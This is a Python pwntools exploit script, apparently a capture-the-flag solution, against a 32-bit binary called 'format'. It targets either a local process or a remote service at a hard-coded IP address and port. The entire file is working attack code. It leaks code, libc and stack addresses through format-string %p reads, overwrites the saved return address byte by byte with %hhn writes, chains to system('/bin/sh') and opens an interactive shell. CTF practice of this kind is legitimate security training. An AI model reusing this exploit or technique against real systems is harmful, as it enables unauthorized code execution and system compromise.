from pwn import *
import sys

if len(sys.argv) < 2:
	debug = True
else:
	debug = False

if debug:
	p = process("./format")
	libc = ELF("/lib/i386-linux-gnu/libc-2.23.so")
	elf = ELF("./format")
else:
	p = remote("152.136.18.34","9999")
	libc = ELF("./libc-2.23.so")
	elf = ELF("./format")

def menu(choice):
	p.sendafter("Choice:",str(choice))

def send(payload):
	menu(1)
	p.sendafter("What do tou want to say:",payload.ljust(0x18,"\x00"))

def leak(offset):
	payload = "%{offset}$p".format(offset = offset - 1)
	send(payload)
	leak_addr = int(p.recvuntil("\n",drop = True),16)
	return leak_addr

def writeaddr(off1,off2,off3,stack1,stack2,addr,value):
	for j in range(4):
		temp_addr = addr + j
		for i in range(4):
			temp = stack2 & 0xfc
			payload = "%{num}c%{off}$hhn".format(num = temp + i,off = off1 - 1)
			send(payload)
			temp = ord(p32(temp_addr)[i])
			payload = "%{num}c%{off}$hhn".format(num = temp,off = off2 - 1)
			send(payload)
		temp = value & 0xff
		payload = "%{num}c%{off}$hhn".format(num = temp,off = off3 - 1)
		send(payload)
		value = value >> 8

def write(off,value):
	pass

def debugf():
	if debug:
		gdb.attach(p,"b printf\nb *{b1}".format(b1 = hex(codebase + 0x985)))

#context.log_level = "debug"
context.terminal = ["tmux","splitw","-h"]
#debugf()
send("%3$p")
leak_addr = int(p.recvuntil("\n",drop = True),16)
codebase = leak_addr - 0x8f3
log.success("code_base:" + hex(codebase))
elf.address = codebase
leak_addr = leak(0xc)
libc.address = leak_addr - 247 - libc.symbols["__libc_start_main"]
log.success("libc_base:" + hex(libc.address))
stack1 = leak(0x12)
log.success("stack1:" + hex(stack1))
eip = stack1 - 0x98
log.success("eip_addr:" + hex(eip))
stack2 = leak(0x36)
log.success("stack2:" + hex(stack2))
off3 = ((stack2 & 0xfffffffc) - stack1) / 4 + 0x36
log.success("off3:" + hex(off3))
system = libc.symbols["system"]
binsh = libc.search("/bin/sh").next()
p4_ret = elf.address + 0x000009e8
#debugf()
writeaddr(0x12,0x36,off3,stack1,stack2,eip,p4_ret)
#debugf()
writeaddr(0x12,0x36,off3,stack1,stack2,eip + 0x14,system)
writeaddr(0x12,0x36,off3,stack1,stack2,eip + 0x14 + 8,binsh)
#debugf()
send("a")
menu(2)
p.interactive()
